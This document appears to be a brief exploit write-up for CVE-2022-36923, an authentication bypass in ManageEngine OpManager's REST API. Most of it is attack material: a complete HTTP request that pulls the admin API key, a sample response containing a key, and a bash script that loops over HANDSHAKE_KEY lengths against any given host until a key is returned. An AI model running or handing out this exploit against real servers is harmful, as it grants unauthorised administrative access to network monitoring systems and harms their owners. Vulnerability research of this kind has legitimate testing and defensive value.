
# Exploiting CVE-2022-36923: ManageEngine OpManager API Auth Bypass

Existing exploit information for CVE-2022-36923, an authentication bypass in
ManageEngine OpManager, suggests a string of length 48 for the HANDSHAKE_KEY
parameter will trigger the bug and bypass authentication.  I found a
vulnerable installation, build 125489, which takes a different payload
length.

Example request to a vulnerable installation and response with an API key:

```
POST /RestAPI/getAPIKey HTTP/1.1
Host: 10.1.2.3:8060
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 102
Connection: keep-alive

operation=getUserAPIKey&username=admin&domainname=-&HANDSHAKE_KEY=000000000000000000000000000000000000
```

```
HTTP/1.1 200 
Content-Type: text/plain;charset=UTF-8
Content-Length: 34
...

c163204b52130d2394afa7a31e106e92
```

I'm not sure why this varies from one installation to another (hash
algorithms?). When in doubt, try strings of different lengths for the
HANDSHAKE_KEY parameter. Here's a bash script to automate it:

```
#!/bin/bash
host=$1
for i in `seq 20 60`; do
    echo trying HANDSHAKE_KEY of length $i...
    HANDSHAKE_KEY=`printf '0%.0s' $(seq 1 $i)`
    req_body="operation=getUserAPIKey&username=admin&domainname=-&HANDSHAKE_KEY=$HANDSHAKE_KEY"
    resp_body=`curl -s -o - -d "$req_body" http://$host:8060/RestAPI/getAPIKey`
    if [[ $resp_body =~ ^[a-z0-9]+ ]]; then
        echo Found API key: $resp_body
        exit 0
    fi
done

echo Could not find API key
exit 1
```
